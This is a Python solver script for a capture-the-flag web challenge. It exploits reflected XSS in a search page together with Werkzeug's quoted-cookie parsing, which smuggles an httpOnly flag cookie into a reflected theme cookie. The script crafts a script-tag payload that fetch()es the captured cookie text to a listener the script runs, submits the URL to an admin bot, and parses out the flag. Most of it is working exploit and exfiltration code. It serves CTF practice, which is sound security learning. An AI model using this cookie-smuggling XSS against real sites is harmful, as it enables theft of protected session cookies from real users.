"""
Solver for See in the Dark.

Vulnerability (documented in README.md): the app reflects the `theme` cookie
on every page (`theme = request.cookies.get("theme", "light")` in
`source/src/app.py`, rendered into `<button id="theme-toggle">{{ theme
}}</button>` in `templates/base.html`). The admin bot (`source/src/bot.py`,
invoked in-process by `POST /report`) sets a `theme` cookie to whatever value
we ask for, and then a *second*, `httpOnly` `flag` cookie with the real flag.

Werkzeug's cookie parser treats a cookie value that starts with an unescaped
`"` as an RFC 2109-style quoted string: it keeps consuming subsequent
`name=value` pairs from the `Cookie` header until it finds a closing `"`. If
we set `theme` to `"whatever` (an opening quote with no matching close), the
raw `Cookie` header sent by the browser becomes:

    theme="whatever; flag=<FLAG>

Werkzeug can't find a closing quote in this header at all, so this first
request drops the (malformed) `theme` cookie entirely -- `theme` reflects as
the default `"light"`.

The search page (`templates/search.html`, extended from `base.html`) reflects
the `q` query parameter completely unescaped in two places: inside the nav
bar's search `<input value="...">` attribute, and as a plain-text child of an
`<h1>` in the page body. A `<script>` tag we inject via `q` breaks the
`value="..."` attribute early wherever it contains a literal `"`, but that
mess is self-contained inside the `<input>` tag (the first `>` the HTML
parser finds afterwards, which happens to be the `>` of our own injected
`</script>`, simply closes that `<input>` tag early). The *second* reflection
of `q`, inside the `<h1>`'s plain text content, is unaffected by that and
renders our `<script>...</script>` as a real, executable script element --
confirmed by manually rendering/driving this exact page with a real browser
engine (Playwright) during development of this solver.

So, per the README's documented technique:

  1. Configure the bot's `theme` cookie to `"whatever` via `POST /report`.
  2. Make the bot visit our crafted `/search?q=<payload>` URL (validated by
     `/report` to be `http://localhost:2000/...`, since the bot runs *inside*
     the very same `app` container -- see `bot.py`'s `driver.get(url)`).
  3. On the first load, our injected script sees that `document.cookie` has
     no `foo=` entry yet, so it sets `document.cookie = foo=bar\"; path=/`
     (closing the quote this time) and calls `location.reload()`.
  4. On the reload, the `Cookie` header now has a matching closing quote
     (`theme="whatever; flag=<FLAG>; foo=bar"`), so Werkzeug successfully
     parses `theme` as the full smuggled string `whatever; flag=<FLAG>;
     foo=bar`, embedding the httpOnly `flag` cookie's value even though our
     script can never read it directly via `document.cookie`. Our script
     (which re-runs identically on this second load, since the URL and its
     `q` parameter are unchanged) now sees `foo=` present and `fetch()`es our
     listener with `#theme-toggle`'s text content, exfiltrating the flag.

This is adapted directly from the README's payload, just swapping its
`webhook.site` URL for a listener we run ourselves (same technique already
used by the working `cross` / `shortnote` solvers for other challenges),
since the bot container has no route to the public internet.
"""

import os
import socket
import sys
import threading
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import requests

LISTENER_PORT = 8080
# The bot runs *inside* the `app` container and only accepts report URLs
# whose host is 127.0.0.1/localhost and whose port is 2000 (see the
# validation in `source/src/app.py`'s `/report` handler), so we always point
# it back at the app's own origin, never at the externally reachable
# endpoint we POST the report to.
APP_SAME_ORIGIN = "http://localhost:2000"


def own_reachable_ip(target_host: str, target_port: int) -> str:
    """The IP by which `target_host` (and, symmetrically, our own listener) is reachable."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((target_host, target_port))
        return s.getsockname()[0]
    finally:
        s.close()


class Listener:
    """Receives the exfiltrated `theme-toggle` text (containing the smuggled flag cookie)."""

    def __init__(self):
        self.value = None
        self.received = threading.Event()
        owner = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, fmt, *args):
                print(f"[listener] {self.address_string()} - {fmt % args}", file=sys.stderr)

            def do_GET(self):
                parsed = urllib.parse.urlparse(self.path)
                if parsed.path == "/exfil":
                    qs = urllib.parse.parse_qs(parsed.query)
                    value = qs.get("flag", [""])[0]
                    print(f"[listener] exfil received: {value!r}")
                    owner.value = value
                    owner.received.set()
                    self.send_response(204)
                    self.end_headers()
                else:
                    self.send_response(404)
                    self.end_headers()

        self.server = ThreadingHTTPServer(("0.0.0.0", LISTENER_PORT), Handler)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)

    def start(self):
        self.thread.start()

    def wait_for_exfil(self, timeout: float) -> str:
        if not self.received.wait(timeout):
            raise TimeoutError("did not receive the exfiltrated theme-toggle text in time")
        return self.value

    def stop(self):
        self.server.shutdown()


def build_payload(listener_url: str) -> str:
    # The documented payload from README.md, just pointed at our own
    # listener instead of the original webhook.site URL.
    return (
        "<script>if (!document.cookie.split('; ').find(row => row.startsWith('foo='))) "
        '{ document.cookie = `foo=bar\\"; path=/`; location.reload(); } '
        "else { fetch(`"
        + listener_url
        + "/exfil?flag=${encodeURIComponent(document.getElementById('theme-toggle').textContent)}`); } "
        "</script>"
    )


def exploit(app_endpoint: str):
    app_host, app_port = app_endpoint.replace("http://", "").replace("https://", "").split(":")
    my_ip = own_reachable_ip(app_host, int(app_port))
    print(f"[*] Our listener is reachable at {my_ip}:{LISTENER_PORT}")

    listener = Listener()
    listener.start()

    listener_url = f"http://{my_ip}:{LISTENER_PORT}"
    payload = build_payload(listener_url)
    query = urllib.parse.quote(payload, safe="")
    page_url = f"{APP_SAME_ORIGIN}/search?q={query}"
    print(f"[*] Crafted search URL: {page_url}")

    # Smuggle the httpOnly `flag` cookie into the reflected `theme` cookie by
    # giving the bot an opening-quote-only theme value (README's `"whatever`).
    report = {
        "description": "theme-toggle shows garbage after reporting a bug, please check",
        "theme": '"whatever',
        "pageUrl": page_url,
    }
    # The bot (Selenium + Firefox) runs synchronously inside the /report
    # handler and can be slow to start up (geckodriver download, browser
    # launch, two page loads), so give it plenty of time.
    r = requests.post(f"{app_endpoint}/report", json=report, timeout=180)
    assert r.ok, f"reporting the URL failed: {r.status_code} {r.text}"
    print(f"[*] Reported URL to the admin bot: {r.text.strip()[:200]!r}")

    smuggled = listener.wait_for_exfil(timeout=90)
    listener.stop()

    assert "flag=" in smuggled, f"exfiltrated theme-toggle text did not contain the flag cookie: {smuggled!r}"
    flag = smuggled.split("flag=", 1)[1].split(";", 1)[0].strip()
    print(f"[*] Flag: {flag}")


if __name__ == "__main__":
    endpoint = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("SERVICE_APP_MAIN_ENDPOINT")
    assert endpoint, "usage: solve.py <app base url>"
    exploit(endpoint)
